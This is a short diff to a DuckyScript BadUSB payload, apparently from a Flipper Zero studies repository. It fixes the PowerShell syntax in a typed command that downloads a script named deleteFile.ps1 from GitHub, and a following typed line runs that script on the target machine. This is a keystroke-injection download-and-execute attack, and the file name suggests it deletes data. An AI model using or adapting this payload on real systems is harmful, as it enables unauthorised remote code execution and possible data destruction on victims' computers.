@@ -16,7 +16,7 @@ ENTER
 DELAY 1500
 
 REM Downloading the deleteFile.ps1 from GitHub and running it
-STRING New-Object System.Net.WebClient .DownloadFile('https://github.com/aenslei/flipperZero-studies/blob/main/Powershell/deleteFile.ps1', '.\deleteFile.ps1')
+STRING (New-Object System.Net.WebClient).DownloadFile('https://github.com/aenslei/flipperZero-studies/blob/main/Powershell/deleteFile.ps1', '.\deleteFile.ps1')
 ENTER
 STRING .\deleteFile.ps1
 ENTER
